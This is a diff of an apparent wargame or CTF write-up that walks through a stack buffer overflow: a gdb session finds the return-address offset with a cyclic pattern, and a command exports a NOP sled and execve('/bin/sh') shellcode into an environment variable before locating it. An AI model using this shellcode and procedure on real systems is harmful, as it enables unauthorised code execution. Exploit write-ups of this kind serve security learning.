@@ -18,7 +18,6 @@ export LANG="fi"
 ```
 
 With gdb and a cyclic pattern for the first method, we find the offset (23 bytes) to the return address.
-
 ```
 (gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
 (gdb) p/x $eip
@@ -26,13 +25,11 @@ $1 = 0x38614137
 ```
 
 We export the shellcode in an environment variable.
-
 ```bash
 export SC=$(python -c 'print(b"\x90"*5000 + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")')
 ```
 
 We find the address of the shellcode in the environment (using gdb and `x/2000s (char **)environ`).
-
 ```
 (gdb) x/2000s (char **)environ
 ```
